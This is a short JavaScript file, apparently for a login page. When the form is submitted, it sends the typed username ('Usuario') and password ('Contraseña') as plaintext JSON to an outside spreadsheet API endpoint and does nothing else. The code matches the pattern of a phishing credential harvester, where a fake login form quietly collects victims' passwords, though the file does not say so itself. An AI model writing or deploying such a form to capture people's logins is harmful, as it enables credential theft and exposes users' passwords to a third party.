const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', async (e) => {
  e.preventDefault();

  await fetch('https://sheet.best/api/sheets/cebc6314-55d9-442d-9ed1-3c21c84bb483', {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      "Usuario": formulario.usuario.value,
      "Contraseña": formulario.contraseña.value
    })
  });


});
